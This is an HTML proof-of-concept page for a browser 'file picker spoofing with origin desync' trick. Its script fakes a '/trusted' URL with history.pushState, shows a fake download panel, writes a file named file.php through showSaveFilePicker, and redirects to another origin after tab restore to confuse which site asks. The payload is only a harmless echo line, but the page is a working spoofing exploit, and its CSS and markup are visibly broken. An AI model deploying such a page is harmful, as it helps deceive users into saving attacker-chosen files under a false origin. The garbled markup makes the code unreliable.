<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>File Picker Spoofing with Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:40px;
  font-size:18px;
  padding:10px 18px;
}

#panel {
  display:none;
  max-width:420px;
  margin:80px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);

h2 { text-align:center; margin-bottom:6px; }

  margin-top:14px;
  font-size:13px;

.save-file-button {
  margin-top:20px;

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Download File</h2>
  <div class="sub">Click below to trigger file picker</div>

  <button class="save-file-button" onclick="triggerSaveFilePicker()">Download File (file.php)</button>

  <div class="notice">
    Demo only — file picker is simulated, no data is saved.
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');

// Trigger File Picker to download file.php
async function triggerSaveFilePicker() {
  if ('showSaveFilePicker' in window) {
    try {
      const handle = await window.showSaveFilePicker({
        suggestedName: 'file.php', // The suggested filename for the file
        types: [{
          description: 'PHP Files',
          accept: {'text/plain': ['.php']}, // Accept PHP file type
        }],
      });

      const writable = await handle.createWritable();
      const phpContent = `<?php echo 'This is a malicious PHP file!'; ?>`; // Simulated PHP content
      await writable.write(phpContent); // Writing PHP content to the file
      await writable.close(); // Closing the writable stream
    } catch (err) {
      console.error('Error opening file picker:', err);
    }
  } else {
    alert('This browser does not support the file picker API.');
  }
}

trigger.onclick = () => {
  // Mimic the trusted origin behavior
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

// Trigger navigation AFTER tab restore (mimics desync)
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'http://google.com:8080'; // Malicious URL to simulate context change
      }, 80);
    });
  });
});
</script>

</body>
